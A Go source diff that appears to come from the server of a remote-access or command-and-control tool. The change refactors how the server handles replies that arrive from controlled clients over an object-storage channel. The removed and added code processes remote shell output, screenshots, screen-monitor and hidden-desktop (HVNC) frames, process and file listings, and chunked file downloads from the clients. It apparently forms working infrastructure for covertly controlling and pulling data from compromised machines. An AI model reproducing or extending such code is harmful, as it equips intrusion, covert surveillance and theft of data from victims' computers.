@@ -9,7 +9,6 @@ import (
 	"BackendTemplate/pkg/utils"
 	"BackendTemplate/pkg/utils/logx"
 	"crypto/rand"
-	"encoding/base64"
 	"encoding/binary"
 	"fmt"
 	"sort"
@@ -18,11 +17,9 @@ import (
 	"time"
 )
 
-// gbkToUtf8 将GBK编码转换为UTF-8 (已迁移到utils.ProcessShellOutput)
-func gbkToUtf8(data []byte) ([]byte, error) {
-	// 使用新的统一编码处理器
-	return utils.ProcessShellOutput(data)
-}
+// XTerm/HVNC 会话广播函数，由 api 包在初始化时注入（nil 时 HandleClientReply 跳过）
+var BroadcastToXTermSessions func(uid string, data []byte)
+var BroadcastToHVNCSessions func(uid, sid string, frame []byte)
 
 func HandleOSSConnection(endpoint, accessKeyID, accessKeySecret, bucketName string) {
 	// 崩溃防护：OSS 处理循环任何 panic 都不能杀死整个进程
@@ -268,167 +265,17 @@ func process_server(name string) {
 			logx.Warnf("⚠️ [OSS] 会话密钥解密失败: %v\n", err)
 			return
 		}
-		// 边界校验：解密后至少 4 字节类型头（其余四协议均有；缺失时异常短包
-		// 会 panic 且被 HandleOSSConnection 顶部 recover 捕获后终止整个 OSS 监听循环）
-		if len(dataBytes) < 4 {
-			logx.Warnf("⚠️ [OSS] 解密后数据长度不足: 需要至少4字节，实际%d字节, UID: %s\n", len(dataBytes), uid)
+		// 客户端回包统一处理（四协议共用 pkg/command/reply_handlers.go，B4 收敛）：
+		// 随之补齐 OSS 原缺失的 XTerm/31 错误回包/HVNC 实时广播、下载进度节流落库
+		// （原每分块直写 UPDATE）、shell 增量追加（原为读整 blob→追加→写回的 IO 放大路径）
+		replyType, data, err := command.SplitReplyPayload(dataBytes)
+		if err != nil {
+			logx.Warnf("⚠️ [OSS] %v, UID: %s\n", err, uid)
 			return
 		}
-		replyTypeBytes := dataBytes[:4]
-		data := dataBytes[4:]
-		replyType := binary.BigEndian.Uint32(replyTypeBytes)
-
-		switch replyType {
-		case 0: //命令行展示或截图数据
-			// 智能判断：结合命令上下文和数据格式检查
-			isExpectedScreenshot := command.VarScreenshotQueue.IsScreenshotExpected(uid)
-			isImageFormat := command.IsImageData(data)
-
-			logx.Debugf("🔍 [OSS] 数据分析 - UID: %s, 数据长度: %d, 期望截图: %t, 图像格式: %t\n",
-				uid, len(data), isExpectedScreenshot, isImageFormat)
-
-			// 只有同时满足以下条件才认为是截图数据：
-			// 1. 服务端最近发送了截图命令
-			// 2. 数据格式符合图像特征
-			// 3. 数据大小合理（避免过小的误判）
-			if isExpectedScreenshot && isImageFormat && len(data) > 1024 {
-				logx.Infof("✅ [OSS] 确认为截图数据 - UID: %s\n", uid)
-
-				// 处理截图数据
-				logx.Infof("📷 [OSS] 收到客户端截图数据 - UID: %s, 原始数据长度: %d\n", uid, len(data))
-
-				// 检查数据是否已经是base64格式的Data URI
-				var screenshotDataURI string
-				if len(data) > 22 && strings.HasPrefix(string(data), "data:image/") {
-					// 数据已经是完整的Data URI格式
-					screenshotDataURI = string(data)
-					logx.Infof("📷 [OSS] 截图数据已是完整的Data URI格式 - UID: %s\n", uid)
-				} else {
-					// 原始二进制数据，需要转换为base64
-					screenshotDataURI = "data:image/png;base64," + base64.StdEncoding.EncodeToString(data)
-					logx.Infof("📷 [OSS] 将原始数据转换为Data URI格式 - UID: %s\n", uid)
-				}
-
-				logx.Infof("📷 [OSS] 正在将截图数据发送到队列 - UID: %s, 数据长度: %d\n", uid, len(screenshotDataURI))
-				command.VarScreenshotQueue.Add(uid, screenshotDataURI)
-
-				// 清除截图期望状态
-				command.VarScreenshotQueue.SetScreenshotExpected(uid, false)
-			} else {
-				// 当作普通命令行输出处理
-				if !isExpectedScreenshot && len(data) > 100000 {
-					logx.Warnf("⚠️ [OSS] 大数据包但非截图上下文 - UID: %s, 长度: %d, 可能是其他大文件传输\n", uid, len(data))
-				}
-
-				// 应用编码转换解决中文乱码问题
-				utf8Data, encodeErr := gbkToUtf8(data)
-				if encodeErr != nil {
-					// 如果编码转换失败，使用原始数据
-					utf8Data = data
-				}
-
-				outputStr := string(utf8Data)
-
-				var shell database.Shell
-				database.Engine.Where("uid = ?", uid).Get(&shell)
-				shell.ShellContent += outputStr + "\n"
-				database.Engine.Where("uid = ?", uid).Update(&shell)
-			}
-		case command.PS:
-			// 应用编码转换解决中文乱码问题
-			utf8Data, encodeErr := gbkToUtf8(data)
-			if encodeErr != nil {
-				// 如果编码转换失败，使用原始数据
-				utf8Data = data
-			}
-			command.VarPidQueue.Add(uid, string(utf8Data))
-		case command.FileBrowse:
-			// 应用编码转换解决中文乱码问题
-			utf8Data, encodeErr := gbkToUtf8(data)
-			if encodeErr != nil {
-				// 如果编码转换失败，使用原始数据
-				utf8Data = data
-			}
-			command.VarFileBrowserQueue.Add(uid, string(utf8Data))
-		case 22: //文件下载第一条信息（v2：fileLen(8)|requestId(4)|path）
-			if len(data) < 12 {
-				logx.Warnf("⚠️ 文件下载信息数据长度不足 - UID: %s, 数据长度: %d\n", uid, len(data))
-				break
-			}
-			fileLen := int64(binary.BigEndian.Uint64(data[:8]))
-			downloadReqID := binary.BigEndian.Uint32(data[8:12])
-			filePath := string(data[12:])
-			database.Engine.QueryString(`UPDATE downloads SET file_size = ?, downloaded_size = ? WHERE uid = ? AND file_path = ?;`, fileLen, 0, uid, filePath)
-			if err := command.VarDownloadFiles.Start(uid, downloadReqID, filePath); err != nil {
-				logx.Errorf("❌ 下载文件打开失败 - UID: %s, 错误: %v\n", uid, err)
-			}
-		case command.DOWNLOAD: //文件下载分块（v2：requestId(4)|chunk）
-			if len(data) < 4 {
-				logx.Warnf("⚠️ 文件下载数据长度不足 - UID: %s\n", uid)
-				break
-			}
-			downloadReqID := binary.BigEndian.Uint32(data[:4])
-			fileContent := data[4:]
-			if ok, err := command.VarDownloadFiles.Append(uid, downloadReqID, fileContent); err != nil {
-				logx.Errorf("❌ 文件下载写入失败 - UID: %s, 错误: %v\n", uid, err)
-				break
-			} else if ok {
-				database.Engine.Exec(`UPDATE downloads SET downloaded_size = downloaded_size + ? WHERE uid = ?;`, len(fileContent), uid)
-			}
-		case command.DRIVES:
-			// 应用编码转换解决中文乱码问题
-			utf8Data, encodeErr := gbkToUtf8(data)
-			if encodeErr != nil {
-				// 如果编码转换失败，使用原始数据
-				utf8Data = data
-			}
-			drives := utils.GetExistingDrives(utf8Data)
-			command.VarDrivesQueue.Add(uid, drives)
-		case command.HVNC_FRAME:
-			// HVNC 隐藏桌面帧 - [4B sidLen][sid][JPEG]
-			sid, jpeg, ok := command.ParseHVNCFrame(data)
-			if ok {
-				command.VarHVNCFrameQueue.Add(uid, sid, jpeg)
-			}
-		case command.SCREENSHOT1:
-			// 屏幕截图操作完成，将截图数据加入队列
-			command.VarScreenshotQueue.Add(uid, string(data))
-		case command.MONITOR_FRAME:
-			// 屏幕监控帧数据 - 【关键修复】正确处理二进制图像数据
-			logx.Infof("📺 收到客户端OSS监控帧数据 - UID: %s, 原始数据长度: %d\n", uid, len(data))
-
-			// 检查数据是否已经是base64格式的Data URI
-			var monitorDataURI string
-			if strings.HasPrefix(string(data), "data:image/") {
-				// 数据已经是完整的Data URI格式
-				monitorDataURI = string(data)
-				logx.Infof("📺 OSS监控帧数据已是完整的Data URI格式 - UID: %s\n", uid)
-			} else {
-				// 原始二进制数据，需要转换为base64
-				monitorDataURI = "data:image/png;base64," + base64.StdEncoding.EncodeToString(data)
-				logx.Infof("📺 将OSS监控帧原始数据转换为Data URI格式 - UID: %s\n", uid)
-			}
-
-			logx.Infof("📺 正在将OSS监控帧数据发送到队列 - UID: %s, 数据长度: %d\n", uid, len(monitorDataURI))
-			// 【关键修复】传递转换后的Data URI而不是原始数据
-			command.VarMonitorFrameQueue.Add(uid, []byte(monitorDataURI))
-		case command.FILE_EDIT_READ:
-			command.HandleFileEditRead(uid, data)
-		case command.FILE_EDIT_WRITE:
-			command.HandleFileEditWrite(uid, data)
-		case command.UPLOAD_ACK:
-			command.HandleUploadAck(uid, data)
-		case command.FILE_OP_RESULT:
-			command.HandleFileOpResult(uid, data)
-		case encrypt.KeyRotateAckReplyType:
-			// P3-1: 客户端密钥轮换确认（OSS 回包未走统一 HandleClientReply，此处独立处理）
-			if encrypt.GlobalKeyManager != nil {
-				if err := encrypt.GlobalKeyManager.ConfirmKeyRotation(uid); err != nil {
-					logx.Warnf("⚠️ [KEY-ROTATE-OSS] 确认轮换失败 - UID: %s, 错误: %v\n", uid, err)
-				} else {
-					logx.Infof("🔑 [KEY-ROTATE-OSS] 客户端 %s 密钥轮换确认完成\n", uid)
-				}
-			}
+		logx.Infof("📨 [OSS] 处理回包 - UID: %s, 消息类型: %d, 数据长度: %d\n", uid, replyType, len(data))
+		if err := command.HandleClientReply("oss", uid, replyType, data, BroadcastToXTermSessions, BroadcastToHVNCSessions); err != nil {
+			logx.Warnf("⚠️ [OSS] 处理回包失败 (type=%d): %v\n", replyType, err)
 		}
 	}
 	return
